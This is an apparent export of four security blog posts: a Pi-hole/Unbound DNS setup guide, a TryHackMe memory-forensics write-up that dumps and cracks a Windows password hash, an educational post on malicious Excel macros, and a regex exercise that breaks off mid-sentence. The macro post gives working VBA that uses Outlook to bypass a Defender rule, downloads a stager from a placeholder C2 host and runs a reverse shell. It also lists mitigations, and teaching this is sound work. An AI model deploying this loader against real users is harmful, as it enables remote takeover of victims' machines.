[{"content":"Introduction Unbound is a validating, recursive, caching open-source DNS resolver primarily developed by NLnet Labs, VeriSign Inc., Nominet, and Kirei. To help increase our online privacy, unbound supports DNS-over-TLS and DNS-over-HTTPS which allows clients to encrypt their communication. Unbound runs on FreeBSD, OpenBSD, NetBSD, MacOS, Linux and Microsoft Windows, with packages available for most platforms.\nThis guide is intended for unbound installation in conjunction with Pi-hole and therefore Pi-hole is the only prerequisite.\n The Pi-hole is a DNS sinkhole that protects your devices from unwanted content, without installing any client-side software. (documentation)\n You can install and configure Pi-hole with the command below on any distribution which utilizes systemd or sysvinit. To verify if your distribution is supported, check out Supported Operating Systems section in the Pi-hole documentation. This guide will not go through the Pi-hole installation steps.\n$ curl -sSL https://install.pi-hole.net | bash\rPersonal setup We decided to install unbound on a dedicated system connected directly to our router via ethernet. Here is the complete list of hardware and accessories we have used for this project:\n Raspberry Pi 4 Model B (4GB RAM)  OS : Raspberry Pi OS Lite (32-bit)   Raspberry Pi 15W USB-C Power Supply Flirc Raspberry Pi 4 Case SanDisk micro SDHC 32 GB Extreme Pro  If you are familiar with how does DNS and unbound work, feel free to skip to the Installation section.\nHow does it actually work? In this section, we will learn how does DNS work, what is the difference between recursive and iterative DNS resolver, how does unbound work and what are the pros and the cons of running your own recursive DNS resolver at home.\nHow does DNS actually work? After a user types a domain name (e.g. \u0026ldquo;thehackernews.com\u0026rdquo;) into their browser, DNS lookup is triggered. A group of DNS servers then help to find the IP address for the domain and return it back to the user\u0026rsquo;s computer.\nBecause we will be installing and setting up unbound as a recursive DNS resolver, let\u0026rsquo;s talk about the difference between recursive and iterative DNS resolver.\nRecursive DNS resolver is a middleman between a client (you) and a DNS nameserver. This type of a DNS resolver is recursively querying other DNS servers until it has an IP address for the requested domain, which is returned to the client. If a DNS resolver has already performed the same query in the recent past, this DNS query is cached and when performed again, our resolver respond to us with the cashed data instead of querying other DNS servers.\nHere are other DNS servers that are queried when using a recursive DNS resolver:\n DNS root nameserver  responds by directing the recursive resolver to a TLD nameserver, based on the extension of that domain (.com, .net, .org, etc.)   DNS TLD nameserver  maintains information for all the domain names that share a common domain extension (.com, .net, .org, etc.)   DNS authoritative nameserver  contains information specific to the domain name it serves and it also provides a recursive resolver with the IP address of that server found in the DNS A record if the domain has a CNAME record it will provide the recursive resolver with an alias domain which means the recursive resolver will have to perform a new DNS lookup for this record    Let\u0026rsquo;s visualize what a DNS lookup looks like when a client is using a recursive DNS resolver.\n\nOn the other hand, when using an iterative DNS resolver client will allow a DNS server to return the best answer it can. If the queried DNS server does not have a match for the query name, it will return a referral to a DNS server authoritative for a lower level of the domain namespace. The DNS client will then make a query to the referral address. This process continues with additional DNS servers down the query chain until either an error or timeout occurs.\nNow let\u0026rsquo;s visualize what a DNS lookup looks like when a client is using a iterative DNS resolver.\n\nHow does unbound work? In a few steps below, we will describe what are the differences when running only a Pi-hole and a Pi-hole with unbound.\n  Standard Pi-hole configuration:\n Client asks the Pi-hole who is domain.com . Pi-hole will check its cache and reply if the answer is known. Pi-hole will check the blocking lists and reply if the domain is blocked. If neither 2. nor 3. point is true, the Pi-hole forwards the DNS request to the configured upstream DNS (usually it is default one from your ISP) When Pi-hole receives the answer, it will reply to a client with the answer. Lastly, Pi-hole will cache the answer so it will be able to respond faster next time a client queries the same domain.    Pi-hole setup with unbound as a local recursive DNS resolver:\n Client asks the Pi-hole who is domain.com . Pi-hole will check its cache and reply if the answer is known. Pi-hole will check the blocking lists and reply if the domain is blocked. If neither 2. nor 3. point is true, the Pi-hole forwards the DNS request to the local recursive DNS resolver = unbound. Unbound will send a query to the DNS root servers asking who is handling .com . The root server answers with a referral to the TLD (Top level domain) server for .com . Unbound will send a query to one of the TLD DNS server for .com asking who is handling domain.com . The TLD server answers with a referral to the authoritative name servers for domain.com . Unbound will send a query to the authoritative name servers asking what is the IP for domain.com . The authoritative server will answer with the IP address of the domain domain.com . Unbound will send the reply to Pi-hole which will reply with the answer to a client. Lastly, Pi-hole will cache the answer so it will be able to respond faster next time a client queries the same domain.    Pros and Cons  Pros  Privacy : Directly contacting the responsive servers means that no server can fully log the exact paths you\u0026rsquo;re going (e.g. Google DNS servers will only be asked if you want to visit a Google website).   Cons  When traversing the path for the first, especially visiting a website for the first time, it may be slower than when we are using big DNS providers which have answers for common used domains cached. The first request to a formerly unknown TLD may take up to a second. Subsequent requests to domains under the same TLD usually complete in \u0026lt; 0.1s. Fortunately, our setup will be configured for efficient caching to minimize the number of queries that will actually have to be performed.    Installation Unbound can be simply installed from a package manager with the command below, if you are using apt as a package manager.\n$ sudo apt install unbound\rOr you can download unbound from Github and then compile and install it with the following command.\n$ ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install\r If you are not installing unbound from a package manager, you have to download the current root hints file (list of primary root servers). After downloading this file, you will need to uncomment the root-hints: configuration line in the suggested config file provided below.\n$ wget https://www.internic.net/domain/named.root -qO- | sudo tee /var/lib/unbound/root.hints\nAdd a cronjob or run this command roughly every six months to update the root.hints file.\n Configuration Now we need to create a config file called pi-hole.conf in /etc/unbound/unbound.conf.d/ directory. Run the following command to create such a file and then copy the content of suggested config file provided to us from an official unbound documentation.\n$ sudo nano /etc/unbound/unbound.conf.d/pi-hole.conf\rSuggested config file\n# Unbound config file\rserver:\r# If no logfile is specified, syslog is used\r# logfile: \u0026quot;/var/log/unbound/unbound.log\u0026quot;\rverbosity: 0\rinterface: 127.0.0.1\rport: 5335\rdo-ip4: yes\rdo-udp: yes\rdo-tcp: yes\r# May be set to yes if you have IPv6 connectivity\rdo-ip6: no\r# You want to leave this to no unless you have *native* IPv6. With 6to4 and\r# Terredo tunnels your web browser should favor IPv4 for the same reasons\rprefer-ip6: no\r# Use this only when you downloaded the list of primary root servers!\r# If you use the default dns-root-data package, unbound will find it automatically\r#root-hints: \u0026quot;/var/lib/unbound/root.hints\u0026quot;\r# Trust glue only if it is within the server's authority\rharden-glue: yes\r# Require DNSSEC data for trust-anchored zones, if such data is absent, the zone becomes BOGUS\rharden-dnssec-stripped: yes\r# Don't use Capitalization randomization as it known to cause DNSSEC issues sometimes\r# see https://discourse.pi-hole.net/t/unbound-stubby-or-dnscrypt-proxy/9378 for further details\ruse-caps-for-id: no\r# Reduce EDNS reassembly buffer size.\r# IP fragmentation is unreliable on the Internet today, and can cause\r# transmission failures when large DNS messages are sent via UDP. Even\r# when fragmentation does work, it may not be secure; it is theoretically\r# possible to spoof parts of a fragmented DNS message, without easy\r# detection at the receiving end. Recently, there was an excellent study\r# \u0026gt;\u0026gt;\u0026gt; Defragmenting DNS - Determining the optimal maximum UDP response size for DNS \u0026lt;\u0026lt;\u0026lt;\r# by Axel Koolhaas, and Tjeerd Slokker (https://indico.dns-oarc.net/event/36/contributions/776/)\r# in collaboration with NLnet Labs explored DNS using real world data from the\r# the RIPE Atlas probes and the researchers suggested different values for\r# IPv4 and IPv6 and in different scenarios. They advise that servers should\r# be configured to limit DNS messages sent over UDP to a size that will not\r# trigger fragmentation on typical network links. DNS servers can switch\r# from UDP to TCP when a DNS response is too big to fit in this limited\r# buffer size. This value has also been suggested in DNS Flag Day 2020.\redns-buffer-size: 1232\r# Perform prefetching of close to expired message cache entries\r# This only applies to domains that have been frequently queried\rprefetch: yes\r# One thread should be sufficient, can be increased on beefy machines. In reality for most users running on small networks or on a single machine, it should be unnecessary to seek performance enhancement by increasing num-threads above 1.\rnum-threads: 1\r# Ensure kernel buffer is large enough to not lose messages in traffic spikes\rso-rcvbuf: 1m\r# Ensure privacy of local IP ranges\rprivate-address: 192.168.0.0/16\rprivate-address: 169.254.0.0/16\rprivate-address: 172.16.0.0/12\rprivate-address: 10.0.0.0/8\rprivate-address: fd00::/8\rprivate-address: fe80::/10\rAfter saving pi-hole.conf configuration file, we will start our local DNS recursive server with the command below.\n$ sudo service unbound restart\rTesting DNS lookup Finally, we will test our unbound recursive DNS resolver with a dig command querying a DNS record for a pi-hole.net domain. Notice status value NOERROR and the IP address for our requested domain.\n$ dig pi-hole.net @127.0.0.1 -p 5335\r; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; pi-hole.net @127.0.0.1 -p 5335\r;; global options: +cmd\r;; Got answer:\r;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 6970\r;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\r;; OPT PSEUDOSECTION:\r; EDNS: version: 0, flags:; udp: 1232\r;; QUESTION SECTION:\r;pi-hole.net. IN A\r;; ANSWER SECTION:\rpi-hole.net. 300 IN A 3.18.136.52\r;; Query time: 19 msec\r;; SERVER: 127.0.0.1#5335(127.0.0.1)\r;; WHEN: Thu Jan 27 18:41:51 CET 2022\r;; MSG SIZE rcvd: 56\rTesting DNSSEC Last step before changing our network settings will be testing DNSSEC validation using once again dig command.\nThe first command should give us a status report of SERVFAIL and no IP address.\n$ dig sigfail.verteiltesysteme.net @127.0.0.1 -p 5335\r; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sigfail.verteiltesysteme.net @127.0.0.1 -p 5335\r;; global options: +cmd\r;; Got answer:\r;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: SERVFAIL, id: 22604\r;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\r;; OPT PSEUDOSECTION:\r; EDNS: version: 0, flags:; udp: 1232\r;; QUESTION SECTION:\r;sigfail.verteiltesysteme.net. IN A\r;; Query time: 299 msec\r;; SERVER: 127.0.0.1#5335(127.0.0.1)\r;; WHEN: Thu Jan 27 18:03:00 CET 2022\r;; MSG SIZE rcvd: 57\rThe second command should give us NOERROR and IP address.\n$ dig sigok.verteiltesysteme.net @127.0.0.1 -p 5335\r; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sigok.verteiltesysteme.net @127.0.0.1 -p 5335\r;; global options: +cmd\r;; Got answer:\r;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 64024\r;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\r;; OPT PSEUDOSECTION:\r; EDNS: version: 0, flags:; udp: 1232\r;; QUESTION SECTION:\r;sigok.verteiltesysteme.net. IN A\r;; ANSWER SECTION:\rsigok.verteiltesysteme.net. 60 IN A 134.91.78.139\r;; Query time: 29 msec\r;; SERVER: 127.0.0.1#5335(127.0.0.1)\r;; WHEN: Thu Jan 27 18:03:15 CET 2022\r;; MSG SIZE rcvd: 71\rPi-hole settings In your Pi-hole web console, navigate to the Settings, then DNS. Make sure to uncheck all upstream DNS servers.\n\nNow, scroll down to the second Upstream DNS Servers section and specify 127.0.0.1#5335 as the Custom DNS (IPv4). This means that your Pi-hole will use your recursive DNS server provided by unbound.\n\nAt last, scroll all the way down and save your settings. After pressing the Save button you should see a pop up Info window\n\nValidating our setup At the time of writing this post, we have been running Pi-hole with unbound for almost 24 hours. We are able to validate that our configuration works from the Upstream servers pie chart, where 65% of all the DNS queries were handled by our local recursive DNS resolver and 20% were cached queries. Remaining 15% of DNS queries were handled by our preconfigured Quad9 upstream server and other public resolver while we were configuring local recursive DNS resolver unbound.\n\nResources  Pi-hole - documentation : https://docs.pi-hole.net/ unbound - about : https://nlnetlabs.nl/projects/unbound/about/ unbound - install : https://docs.pi-hole.net/guides/dns/unbound/ What is DNS? : https://www.cloudflare.com/learning/dns/what-is-dns/ What is recursive DNS? : https://www.cloudflare.com/learning/dns/what-is-recursive-dns/ DNS server types : https://www.cloudflare.com/learning/dns/dns-server-types/  Thank you for reading and we hope you learned something new.\n","description":"Learn how to set up your own Recursive DNS Server at home on a Raspberry Pi 4.","id":0,"section":"posts","tags":["unbound","pi-hole","privacy"],"title":"Setting up your own Recursive DNS Server","uri":"https://martinkubecka.github.io/posts/general/recursive_dns/"},{"content":"   Title  Memory Forensics     Info  Perform memory forensics to find the flags.   Difficulty  Easy   Date 2021/07/22    Login  The forensic investigator on-site has performed the initial forensic analysis of John\u0026rsquo;s computer and handed you the memory dump he generated on the computer. As the secondary forensic investigator, it is up to you to find all the required information in the memory dump.\n First we need to figure out the profile we will use.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  $ volatility -f Snapshot6.vmem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/media/sf_Shared/Mem/Snapshot6.vmem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002c4a0a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002c4bd00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2020-12-27 06:20:05 UTC+0000 Image local date and time : 2020-12-26 22:20:05 -0800   Based on the Suggested Profile(s) we will choose Win7SP1x64.\nWhat is John\u0026rsquo;s password?\nTo dump passwords hashes (LM/NTLM) from memory we will use hashdump plugin.\n1 2 3 4 5 6  $ volatility -f Snapshot6.vmem --profile=Win7SP1x64 hashdump Volatility Foundation Volatility Framework 2.6 Administrator:[REDACTED]::: Guest:501:[REDACTED]::: John:1001:[REDACTED]::: HomeGroupUser$:1002:[REDACTED]:::   Then we will use john to crack John\u0026rsquo;s password hash.\n1 2 3 4 5 6 7 8 9  $ john john.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT Using default input encoding: UTF-8 Loaded 1 password hash (NT [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [REDACTED] (aad3b435b51404eeaad3b435b51404ee) 1g 0:00:00:03 DONE (2021-07-22 23:21) 0.3246g/s 2980Kp/s 2980Kc/s 2980KC/s charmcez..charmaise Use the \u0026#34;--show --format=NT\u0026#34; options to display all of the cracked passwords reliably Session completed   As we can see on the output above, we sucessfully cracked the hash and obtained John\u0026rsquo;s password.\nAnalysis  On arrival a picture was taken of the suspect\u0026rsquo;s machine, on it, you could see that John had a command prompt window open. The picture wasn\u0026rsquo;t very clear, sadly, and you could not see what John was doing in the command prompt window.\n  To complete your forensic timeline, you should also have a look at what other information you can find, when was the last time John turned off his computer?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  $ volatility -f Snapshot19.vmem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/media/sf_Shared/Mem/Snapshot19.vmem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002bfd0a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002bfed00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2020-12-27 23:06:01 UTC+0000 Image local date and time : 2020-12-28 00:06:01 +0100   Based on the Suggested Profile(s), we will again choose Win7SP1x64 profile.\nWhen was the machine last shutdown?\nTo print the last shutdown from registry, we will use shutdowntime plugin.\n1 2 3 4 5 6 7  $ volatility -f Snapshot19.vmem --profile=Win7SP1x64 shutdowntime Volatility Foundation Volatility Framework 2.6 Registry: SYSTEM Key Path: ControlSet001\\Control\\Windows Key Last updated: 2020-12-27 22:50:12 UTC+0000 Value Name: ShutdownTime Value: 2020-12-27 22:50:12 UTC+0000   What did John write?\nIf we want to extract command history, we will use plugin called consoles, which will extract it by scaning for _CONSOLE_INFORMATION.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  $ volatility -f Snapshot19.vmem --profile=Win7SP1x64 consoles Volatility Foundation Volatility Framework 2.6 ************************************************** ConsoleProcess: conhost.exe Pid: 2488 Console: 0xffa66200 CommandHistorySize: 50 HistoryBufferCount: 1 HistoryBufferMax: 4 OriginalTitle: %SystemRoot%\\System32\\cmd.exe Title: Administrator: C:\\Windows\\System32\\cmd.exe AttachedProcess: cmd.exe Pid: 1920 Handle: 0x60 ---- CommandHistory: 0x21e9c0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 7 LastAdded: 6 LastDisplayed: 6 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 at 0x1fe3a0: cd / Cmd #1 at 0x1f78b0: echo THM{[REDACTED]} \u0026gt; test.txt Cmd #2 at 0x21dcf0: cls . . .   The flag was written between the curly brackets.\nTrueCrypt  A common task of forensic investigators is looking for hidden partitions and encrypted files, as suspicion arose when TrueCrypt was found on the suspect\u0026rsquo;s machine and an encrypted partition was found. The interrogation did not yield any success in getting the passphrase from the suspect, however, it may be present in the memory dump obtained from the suspect\u0026rsquo;s computer.\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  $ volatility -f Snapshot6.vmem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/media/sf_Shared/Mem/Snapshot14.vmem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002c4d0a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002c4ed00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2020-12-27 13:41:31 UTC+0000 Image local date and time : 2020-12-27 05:41:31 -0800   Based on the Suggested Profile(s), we will once again choose Win7SP1x64 profile.\nWhat is the TrueCrypt passphrase?\nTo obtain a TrueCrypt passphrase, we will use plugin called truecryptpassphrase, which is scan fot cached TrueCrypt passphrase.\n1 2 3  $ volatility -f Snapshot14.vmem --profile=Win7SP1x64 truecryptpassphrase Volatility Foundation Volatility Framework 2.6 Found at 0xfffff8800512bee4 length 11: for[REDACTED]not   We have sucessfully obtained all the hidden flages.\nResources  Volatility : https://github.com/volatilityfoundation/volatility/ Volatility wiki : https://github.com/volatilityfoundation/volatility/wiki Cheatsheet : https://book.hacktricks.xyz/forensics/volatility-examples  Thank you for reading this blog post.\n","description":"Perform memory forensics to find the flags.","id":1,"section":"posts","tags":["forensics","volatility"],"title":"Memory Forensics [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/memory-forensics/"},{"content":"Excel Malicious Macro Introduction Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.\nA macro is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.\nMacros are written in the VBA (Visual Basic) scripting language, which can work with the system application interface from a privileged context (MS Excel), thanks to which it allows good interaction with the operating system. Script execution is configurable according to events that occur based on user action\n AutoExec : Launches when a document is opened AutoNew : Launches when a new document is created AutoOpen : Launches when an existing document is opened AutoClose : Launches when the document is closed  where the event triggers malicious code. When malicious code starts executing, the attacker will be able to work with Win32 API, COM objects, VBA code, or it is possible to invoke the loading of their own library.\nAs macro security went unnoticed, Microsoft and other security companies began working on protection mechanisms.\nOne of these protection mechanisms, which is implemented directly in MS Excel, is that macros do not run automatically when a dangerous document is opened.\nAs a result, social engineering methods have begun to be used to force the user to allow the use of macros.\nOne way, for example, might be to make the document look encrypted and ask the user to enable the macro for security reasons. There are no limits to creativity.\nCreating a Malicious Macro Macros can be enabled, but we need an entry point for our malicious program. After macros are enabled, we can proceed to the actual execution of the code. Before describing the technical details, the following infographic accurately describes our process of infecting a computer and taking complete control of it.\n\nOur event handlers can be registered simply by giving the procedure the same name as the event we want to run, or by naming one of our code modules after the automatic macro and including the procedure in that module.\nIn addition to these application events, the Office documents themselves trigger various events and may contain their own utilities. These event handling procedures are contained in the document instead of in the code module. In our code, we use the Workbook_Open event, which starts when a document is opened.\nPrivate Sub Workbook_Open()\rAutoRunMacroBypassDownload\rEnd Sub\rThis event is executed by a service code located in a separate Module. If we want to create a Shell instance, a rule from MS Defender will block our request. Specifically, Microsoft states the following in its documentation:\n The rule blocks Office applications from creating child processes. Office applications include Word, Excel, PowerPoint, OneNote and Access. Creating malicious child processes is a common malware strategy. Malware that abuses Office as a vector often runs VBA macros and uses code to download and run additional code.\n We can notice that the documents do not include Outlook, which we use to create a Shell object and bypass the rule from MS Defender. Then we execute a GET request to the Command and Control Server (also known as C2 or C\u0026amp;C), from where we download a stager that contains an application called Client, which establishes a TCP connection to the C2 server.\nWe decided to compile our own reverse shell written in C# for two main reasons. First of all, it is important to realize that both attackers and antivirus developers have access to programs such as Metasploit and Empire. For this reason, generated reverse shell binaries, whether after obfuscation or injected into a legitimate application, are marked as malicious based on a fingerprint.\nThe second reason is that once we insert any PowerShell cmdlets into a macro, the file is always marked as malicious and Windows Defender removes it as soon as it is created.\n' Bypass defender chiled process protection using outlook process\rSub AutoRunMacroBypassDownload()\r' create outlook object\rSet objOL = CreateObject(\u0026quot;Outlook.Application\u0026quot;)\r' create shell object under the outlook object\rSet WshShell = objOL.CreateObject(\u0026quot;Wscript.Shell\u0026quot;)\r' exec the command from the new shell object\r' download stager\rSet WshShellExec = WshShell.Exec(\u0026quot;curl http://\u0026lt;SERVER IP\u0026gt;:\u0026lt;SERVER PORT\u0026gt;/stager.zip --output C:\\Users\\Public\\Documents\\stager.zip\u0026quot;)\rApplication.Wait (Now + TimeValue(\u0026quot;00:00:03\u0026quot;))\r' unzip stager content\rCall UnzipAFile(\u0026quot;C:\\Users\\Public\\Documents\\stager.zip\u0026quot;, \u0026quot;C:\\Users\\Public\\Documents\\\u0026quot;)\rApplication.Wait (Now + TimeValue(\u0026quot;00:00:03\u0026quot;))\r' execute encoded reverse shell\rSet WshShellExec = WshShell.Exec(\u0026quot;C:\\Users\\Public\\Documents\\Shell.exe\u0026quot;)\rEnd Sub\rSub UnzipAFile(zippedFileFullName As Variant, unzipToPath As Variant)\rDim ShellApp As Object\r'Copy the files \u0026amp; folders from the zip into a folder\rSet ShellApp = CreateObject(\u0026quot;Shell.Application\u0026quot;)\rShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).items\rEnd Sub\rAfter launching the Client application, we have gained control over the device and we can proceed with enumeration and subsequent eventual exploitation.\nIn the real world, it would be appropriate to obfuscate our macro as well as the application for establishing a TCP connection, but since this is a demonstration program, this process was not necessary.\nStatic analysis Excel document \nIn the picture above, we can see that apart from Kaspersky antivirus, another relevant antivirus program did not detect that it was a malicious document.\nTCP Client \nIn the case of an application that establishes a TCP connection, this is mainly detected by Microsoft Defender. In 2019, this method was marked as undetectable, but we assume that due to its exposure, MS Defender has recently started to focus on it. Another option would be to use appropriate code obfuscation or write this client in a C++ programming language.\nReal World Examples The use of VBA macros to spread viruses has existed since the creation of VBA itself (1993). This method ceased to be used around the year 2000 because simpler and more reliable methods were found to infect a computer.\nMacros in Office applications began to be abused again in 2012, mainly to collect system information such as IP address, installed applications or running system processes.\nMacro abuse erupted in 2016, when attackers were able to use macros to infect the systems with Cerber ransomware.\nAnother known abuse of macros was in 2019, when attackers used macros to invoke Powershell, which downloaded and launched malware. It was a GandCrab ransomware and a Ursnif Trojan horse aimed at filtering data from the system.\nAlso in 2021, the mentioned Ursnif malware continues to be spread. The target of the attack were Italian banks, of which about 100 were successfully infected. Its attempt was to steal the login details, which were then sent using imitation of Zoom or Webex calls.\nMitigation  Globally disable macros for Microsoft Office applications. (Enable or disable macros) Do not open suspicious emails or suspicious attachments. Do not open untrusted .xlsm, .docm, .pptm documents. Delete any emails from unknown people or with suspicious content. Do not use an Administrator account for daily tasks on Windows operating system. Update Windows and antivirus regularly. Back up your documents regularly. Enterprises can prevent macro malware from running executable content using ASR rules.  External References   Malicious Macros\n https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/    Macro Malware\n https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware    MS Excel Weaponization Techniques\n https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5    Watch Hackers Craft Malicious Office Macros\n https://youtu.be/e2icQFxhp3w    Real World Examples\n https://thehackernews.com/search/label/macros    Source code for TCP client\n https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc    \rThank you for reading and we hope you learned something new.\n","description":"Learn about crafting and analyzing Microsoft Excel malicious macros.","id":2,"section":"posts","tags":["malware"],"title":"Weaponizing Malicious Macros","uri":"https://martinkubecka.github.io/posts/general/malicious-macros/"},{"content":"   Title  Regular Expressions     Info  Learn and practise using regular expressions.   Difficulty  Medium   Date 2021/05/02    Introduction Regular expressions (or Regex) are patterns of text that you define to search documents and match exactly what you\u0026rsquo;re looking for.\nCharsets A charset is defined by enclosing in [ square brackets ] the character(s), or range of characters that we want to match. Then, it finds every occurrence of the pattern we have defined in the file/text we are searching.\nTo exclude certain characters from a charset, we use the ^ hat symbol. For example [^k]ing will match ring, sing, $ing, but not king.\nIf we want to exclude charsets, not just single characters, we can do it just like this : [^a-c]at will match fat and hat, but not bat or cat.\nMatch all of the following characters: c, o, g\n [cog]\n Match all of the following words: cat, fat, hat\n [cfh]at\n Match all of the following words: Cat, cat, Hat, hat\n [cChH]at\n Match all of the following filenames: File1, File2, file3, file4, file5, File7, file9\n [fF]ile[1-9]\n Match all of the filenames of question 4, except \u0026ldquo;File7\u0026rdquo;\n [fF]ile[^7]\n Wildcards and optional characters The wildcard that is used to match any single character (except the line break) is the . dot. That means that a.c will match aac, abc, a0c, a!c, and so on.\nAlso, we can set a character as optional in our pattern using the ? question mark. That means that abc? will match ab and abc, since the c is optional.\nIf we want to search for . a literal dot, we have to escape it with a \\ reverse slash. That means that a.c will match a.c, but also abc, a@c, and so on. But a\\.c will match just a.c.\nMatch all of the following words: Cat, fat, hat, rat\n .at\n Match all of the following words: Cat, cats\n [cC]ats?\n Match the following domain name: cat.xyz\n cat\\.xyz\n Match all of the following domain names: cat.xyz, cats.xyz, hats.xyz\n [ch]ats?\\.xyz\n Match every 4-letter string that doesn\u0026rsquo;t end in any letter from n to z\n ...[^n-z]\n Match bat, bats, hat, hats, but not rat or rats\n [^r]ats?\n Metacharacters and repetitions There are easier ways to match bigger charsets. For example, \\d is used to match any single digit. Here\u0026rsquo;s a reference:\n\\d matches a digit, like 9\n\\D matches a non-digit, like A or @\n\\w matches an alphanumeric character, like a or 3\n\\W matches a non-alphanumeric character, like ! or #\n\\s matches a whitespace character (spaces, tabs, and line breaks)\n\\S matches everything else (alphanumeric characters and symbols)\nUnderscores _ are included in the \\w metacharacter and not in \\W. That means that \\w will match every single character in test_file.\nOften we want a pattern that matches many characters of a single type in a row, and we can do that with repetitions. For example, {2} is used to match the preceding character (or metacharacter, or charset) two times in a row. That means that z{2} will match exactly zz.\nHere\u0026rsquo;s a reference for each repetition along with how many times it matches the preceding pattern:\n{12} - exactly 12 times.\n{1,5} - 1 to 5 times.\n{2,} - 2 or more times.\n* - 0 or more times.\n+ - 1 or more times.\nMatch the following word: catssss\n cats{4}\n Match all of the following words (use the * sign): Cat, cats, catsss\n [cC]ats*\n Match all of the following sentences (use the + sign): regex go br, regex go brrrrrr\n regex go br+\n Match all of the following filenames: ab0001, bb0000, abc1000, cba0110, c0000 (don\u0026rsquo;t use a metacharacter)\n [abc]{1,3}[01]{4}\n Match all of the following filenames: File01, File2, file12, File20, File99\n [fF]ile\\d{1,2}\n Match all of the following folder names: kali tools, kali tools\n kali\\s+tools\n Match all of the following filenames: notes~, stuff@, gtfob#, lmaoo!\n \\w{5}\\W\n Match the string in quotes (use the * sign and the \\s, \\S metacharacters): \u0026ldquo;2f0h@f0j0%! a)K!F49h!FFOK\u0026rdquo;\n \\S*\\s*\\S*\n Match every 9-character string (with letters, numbers, and symbols) that doesn\u0026rsquo;t end in a \u0026ldquo;!\u0026rdquo; sign\n \\S{8}[^!]\n Match all of these filenames (use the + symbol): .bash_rc, .unnecessarily_long_filename, and note1\n \\.?\\w+\n Starts with/ ends with, groups, and either/ or Sometimes it\u0026rsquo;s very useful to specify that we want to search by a certain pattern in the beginning or the end of a line. We do that with these characters:\n^ - starts with\n$ - ends with\nSo for example, if we want to search for a line that starts with abc, we can use ^abc.\nIf you want to search for a line that ends with xyz, you can use xyz$.\nNote that the ^ hat symbol is used to exclude a charset when enclosed in [square brackets], but when it is not, it is used to specify the beginning of a word.\nWe can also define groups by enclosing a pattern in (parentheses). We will use it to define an either/ or pattern, and also to repeat patterns. To say \u0026ldquo;or\u0026rdquo; in Regex, we use the | pipe.\nFor an \u0026ldquo;either/or\u0026rdquo; pattern example, the pattern during the (day|night) will match both of these sentences: during the day and during the night.\nMatch every string that starts with \u0026ldquo;Password:\u0026rdquo; followed by any 10 characters excluding \u0026ldquo;0\u0026rdquo;\n ^Password:[^0]{10}\n Match \u0026ldquo;username: \u0026quot; in the beginning of a line (note the space!)\n ^username:\\s\n Match every line that doesn\u0026rsquo;t start with a digit (use a metacharacter)\n ^\\d\n Match this string at the end of a line: EOF$\n EOF\\$$\n Match all of the following sentences:\n  I use 